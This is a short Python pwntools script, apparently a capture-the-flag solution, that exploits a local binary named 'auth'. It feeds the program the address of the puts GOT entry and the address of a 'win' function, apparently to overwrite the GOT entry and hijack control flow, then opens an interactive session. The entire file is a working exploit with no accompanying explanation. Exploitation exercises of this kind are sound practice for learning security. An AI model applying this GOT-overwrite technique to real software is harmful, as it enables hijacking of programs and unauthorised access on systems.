from pwn import *

putsGOT = "0804a00c"
winAddr = "0804854b"

context.binary
io = process("./auth")
io.sendlineafter("?\n", putsGOT)
io.sendlineafter("\n", winAddr)

io.interactive()
